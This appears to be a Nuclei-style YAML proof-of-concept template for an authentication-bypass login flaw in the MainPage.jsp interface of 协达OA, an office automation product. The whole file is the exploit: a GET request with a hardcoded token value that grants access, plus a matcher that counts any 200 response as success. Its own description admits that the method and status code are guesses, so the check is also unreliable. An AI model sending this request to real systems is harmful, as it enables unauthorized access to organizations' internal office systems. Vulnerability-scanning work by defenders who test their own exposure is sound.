id: poc-377884986ebfce4e4e61
info:
  name: 协达OA的MainPage接口存在绕过验证登陆漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2025
http:
- raw:
  - 'GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
